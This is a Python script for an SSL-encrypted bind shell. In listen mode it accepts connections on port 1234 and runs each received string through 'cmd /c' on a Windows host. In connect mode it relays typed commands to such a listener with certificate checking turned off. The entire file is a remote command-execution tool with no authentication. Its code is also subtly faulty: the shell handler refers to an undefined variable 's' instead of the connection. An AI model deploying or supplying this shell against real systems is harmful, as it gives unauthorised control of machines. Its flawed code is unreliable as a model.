import socket
import subprocess
import argparse
import threading
import ssl

DEFAULT_PORT = 1234
MAX_BUFFER = 4096

def execute_cmd(cmd):
    try:
        output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
    except:
        output = b"Command Failed!"
    return output

def decode_and_strip(s):
    return s.decode("latin-1").strip()

def shell_thread(conn):
    s.send(b"[ -- Connected! -- ]")
    try:
        while True:
            s.send(b"\r\nEnter Command> ")

            data = s.recv(MAX_BUFFER)
            if not data:
                break

            buffer = decode_and_strip(data)
            if buffer == "exit":
                break

            print("> Executing Command: '{}'".format(buffer))
            s.send(execute_cmd(buffer))

    except:
        pass
    finally:
        conn.close()

def send_thread(conn):
    try:
        while True:
            data = input() + "\n"
            conn.send(data.encode("latin-1"))
    except:
        pass
    finally:
        conn.close()

def recv_thread(conn):
    try:
        while True:
            data = decode_and_strip(conn.recv(MAX_BUFFER))
            if not data:
                break

            print("\n" + data, end="", flush=True)
    except:
        pass
    finally:
        conn.close()

def server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", DEFAULT_PORT))
    server_socket.listen()

    print("[ -- Starting bind shell! -- ]")
    while True:
        client_socket, addr = server_socket.accept()

        # Wrap the client socket with SSL
        ssl_conn = ssl.wrap_socket(client_socket, server_side=True, keyfile="server-key.pem", certfile="server-cert.pem", ssl_version=ssl.PROTOCOL_TLS)

        print("[ -- New User Connected! -- ]")
        threading.Thread(target=shell_thread, args=(ssl_conn,)).start()

def client(ip):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Wrap the client socket with SSL
    ssl_conn = ssl.wrap_socket(client_socket, keyfile=None, certfile=None, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_TLS)

    ssl_conn.connect((ip, DEFAULT_PORT))

    print("[ -- Connecting to bind shell! -- ]")

    threading.Thread(target=send_thread, args=(ssl_conn,)).start()
    threading.Thread(target=recv_thread, args=(ssl_conn,)).start()

parser = argparse.ArgumentParser()

parser.add_argument("-l", "--listen", action="store_true", help="Setup a bind shell", required=False)
parser.add_argument("-c", "--connect", help="Connect to a bind shell", required=False)

args = parser.parse_args()

if args.listen:
    server()
elif args.connect:
    client(args.connect)
